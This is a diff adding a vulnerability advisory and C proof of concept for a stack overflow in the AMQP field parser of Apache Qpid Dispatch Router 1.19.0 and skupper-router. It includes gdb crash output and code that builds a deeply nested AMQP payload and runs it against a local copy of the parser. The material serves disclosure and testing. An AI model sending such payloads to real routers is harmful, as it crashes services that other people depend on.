@@ -1,0 +1,115 @@
+/*
+
+
+Apache Qpid Dispatch Router 1.19.0 Remote Stack Overflow
+
+
+Vendor: The Apache Software Foundation
+Product web page: https://qpid.apache.org/components/dispatch-router/index.html
+Affected version: 1.19.0
+
+Summary: A high-performance, lightweight AMQP 1.0 message router, written
+in C and built on Qpid Proton. It provides flexible and scalable interconnect
+between any AMQP endpoints, whether they be clients, brokers or other AMQP-enabled
+services.
+
+Desc: Apache Qpid Dispatch suffers from a denial-of-service vulnerability caused
+by unbounded recursion in its AMQP field parser. The parser recurses once per
+nested child with no depth limit when parsing message annotations, so a remote
+peer can send a deeply nested AMQP message and exhaust the stack, crashing the
+router. This issue is tracked as CVE-2026-88763 assigned by Red Hat as the CNA
+against the maintained downstream component skupper-router (Red Hat Service Interconnect),
+which carries the same AMQP field parser. The Apache Qpid Dispatch project is
+frozen (development moved to skupper-router). Red Hat notes that exploitation
+requires a valid x.509 certificate signed by the interconnect certificate authority,
+i.e. a peer already admitted to the mutually authenticated network, can crash the
+router.
+
+-----------------------------------------------------------------------------------
+$ gdb -q -batch -ex 'run 500000' -ex 'bt 8' ./skupper
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
+Nested AMQP annotation payload: depth=500000, 4500000 bytes.
+Router calls qd_message_parse_annotations -> qd_parse -> qd_parse_internal ...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00005555555552ab in qd_parse_internal (b=<error reading variable: Cannot access memory at address 0x7fffff7fefe8>, end=<error reading variable: Cannot access memory at address 0x7fffff7fefe0>) at skupper.c:71
+71      static void qd_parse_internal(const unsigned char *b, const unsigned char *end) {
+#0  0x00005555555552ab in qd_parse_internal (b=<error reading variable: Cannot access memory at address 0x7fffff7fefe8>, end=<error reading variable: Cannot access memory at address 0x7fffff7fefe0>) at skupper.c:71
+#1  0x00005555555553a6 in qd_parse_internal (b=0x7ffff7adbc74 <incomplete sequence \320>, end=0x7ffff7da6a30 "") at skupper.c:80
+#2  0x00005555555553a6 in qd_parse_internal (b=0x7ffff7adbc6b <incomplete sequence \320>, end=0x7ffff7da6a30 "") at skupper.c:80
+#3  0x00005555555553a6 in qd_parse_internal (b=0x7ffff7adbc62 <incomplete sequence \320>, end=0x7ffff7da6a30 "") at skupper.c:80
+#4  0x00005555555553a6 in qd_parse_internal (b=0x7ffff7adbc59 <incomplete sequence \320>, end=0x7ffff7da6a30 "") at skupper.c:80
+#5  0x00005555555553a6 in qd_parse_internal (b=0x7ffff7adbc50 <incomplete sequence \320>, end=0x7ffff7da6a30 "") at skupper.c:80
+#6  0x00005555555553a6 in qd_parse_internal (b=0x7ffff7adbc47 <incomplete sequence \320>, end=0x7ffff7da6a30 "") at skupper.c:80
+#7  0x00005555555553a6 in qd_parse_internal (b=0x7ffff7adbc3e <incomplete sequence \320>, end=0x7ffff7da6a30 "") at skupper.c:80
+-----------------------------------------------------------------------------------
+
+Tested on: Kali Linux
+           Microsoft Windows 10 (x86_64)
+           Red Hat Service Interconnect 2 for RHEL 8
+           Red Hat Service Interconnect 2 for RHEL 9 (skupper-router)
+           gcc 15.2.0
+           gdb 17.2
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-6025
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6025
+
+
+13.08.2026
+
+*/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+#define QD_AMQP_LIST32 0xd0
+
+static unsigned char *build_nested(uint32_t depth, size_t *out_len) {
+    size_t per = 9;
+    size_t len = (size_t)depth * per;
+    unsigned char *buf = malloc(len);
+    unsigned char *p = buf;
+    for (uint32_t i = 0; i < depth; i++) {
+        uint32_t count = (i == depth - 1) ? 0 : 1;
+        uint32_t size  = 4 + (uint32_t)((depth - 1 - i) * per);
+        *p++ = QD_AMQP_LIST32;
+        p[0]=size>>24; p[1]=size>>16; p[2]=size>>8; p[3]=size; p+=4;
+        p[0]=count>>24;p[1]=count>>16;p[2]=count>>8;p[3]=count;p+=4;
+    }
+    *out_len = len;
+    return buf;
+}
+
+static int frames = 0;
+static void qd_parse_internal(const unsigned char *b, const unsigned char *end) {
+    frames++;
+    if (b + 9 > end) return;
+    unsigned char tag = *b++;
+    if (tag != QD_AMQP_LIST32) return;
+    uint32_t size  = (b[0]<<24)|(b[1]<<16)|(b[2]<<8)|b[3]; b+=4;
+    uint32_t count = (b[0]<<24)|(b[1]<<16)|(b[2]<<8)|b[3]; b+=4;
+    (void)size;
+    for (uint32_t i = 0; i < count; i++) {
+        qd_parse_internal(b, end);
+    }
+}
+
+int main(int argc, char **argv) {
+    uint32_t depth = (argc > 1) ? (uint32_t)strtoul(argv[1], 0, 10) : 500000;
+    size_t len; unsigned char *buf = build_nested(depth, &len);
+    printf("Nested AMQP annotation payload: depth=%u, %zu bytes.\n", depth, len);
+    printf("Router calls qd_message_parse_annotations -> qd_parse -> qd_parse_internal ...\n");
+    fflush(stdout);
+    qd_parse_internal(buf, buf + len);
+    printf("Survived: parsed %d frames without crashing (depth too small)\n", frames);
+    return 0;
+}
